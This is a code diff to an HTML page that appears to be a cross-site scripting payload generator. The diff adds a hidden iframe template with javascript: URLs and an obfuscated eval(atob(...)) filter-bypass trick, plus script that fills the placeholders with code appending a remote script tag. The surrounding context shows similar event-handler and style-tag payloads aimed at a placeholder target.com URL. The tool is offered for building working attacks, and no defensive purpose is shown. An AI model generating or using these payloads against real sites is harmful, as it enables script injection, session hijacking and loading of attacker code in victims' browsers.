@@ -89,7 +89,15 @@ https://target.com/page_with_the_payload#'eval\x28atob\x28\x27arr0w1_base64\x27\
 🔥
 "><style>@keyframes x{}</style><i style="animation-name:x" onwebkitanimationend=`eval\x28atob\x28\x27arr0w1_base64\x27\x29\x29`instanceof{[Symbol[`hasInstance`]]:eval}></i><x id="</textarea>
 
+    <textarea id="data6" hidden="true">
+1⃣️ iframe src
+<iframe style=display:none src="javascript:arr0w1_on_event_js">
+
+🔥
+<iframe style=display:none src="javascript:`eval\x28atob\x28\x27arr0w1_base64\x27\x29\x29`instanceof{[Symbol[`hasInstance`]]:eval}"></textarea>
+
 <!-- ----------------- -->
+
     <main role="main">
         <section class="jumbotron text-center g-light">
             <div class="container">
@@ -140,6 +148,12 @@ https://target.com/page_with_the_payload#'eval\x28atob\x28\x27arr0w1_base64\x27\
             <p class="font-weight-bold">Tag - style </p>
             <textarea id="payload5" class="form-control" rows="3"></textarea>
 
+            <br>
+            <br>
+            6
+            <p class="font-weight-bold">URLs </p>
+            <textarea id="payload6" class="form-control" rows="3"></textarea>
+
         </section>
     </main>
 
@@ -166,6 +180,7 @@ https://target.com/page_with_the_payload#'eval\x28atob\x28\x27arr0w1_base64\x27\
     element_data3 = document.getElementById("data3");
     element_data4 = document.getElementById("data4");
     element_data5 = document.getElementById("data5");
+    element_data6 = document.getElementById("data6");
 
     // get datas
     var data0 = element_data0.value;
@@ -174,6 +189,7 @@ https://target.com/page_with_the_payload#'eval\x28atob\x28\x27arr0w1_base64\x27\
     var data3 = element_data3.value;
     var data4 = element_data4.value;
     var data5 = element_data5.value;
+    var data6 = element_data6.value;
 
     // -----
 
@@ -219,12 +235,15 @@ https://target.com/page_with_the_payload#'eval\x28atob\x28\x27arr0w1_base64\x27\
 
         document.getElementById("payload5").value = data5.replace(/arr0w1_on_event_js/g,js_code_append_a_script_tag_with_url_path).replace(/arr0w1_base64/g, js_code_append_a_script_tag_btoa_ed);
 
+        document.getElementById("payload6").value = data6.replace(/arr0w1_on_event_js/g,js_code_append_a_script_tag_with_url_path).replace(/arr0w1_base64/g, js_code_append_a_script_tag_btoa_ed);
+
         auto_grow(document.getElementById("payload0"));
         auto_grow(document.getElementById("payload1"));
         auto_grow(document.getElementById("payload2"));
         auto_grow(document.getElementById("payload3"));
         auto_grow(document.getElementById("payload4"));
         auto_grow(document.getElementById("payload5"));
+        auto_grow(document.getElementById("payload6"));
     }
 
     // -----
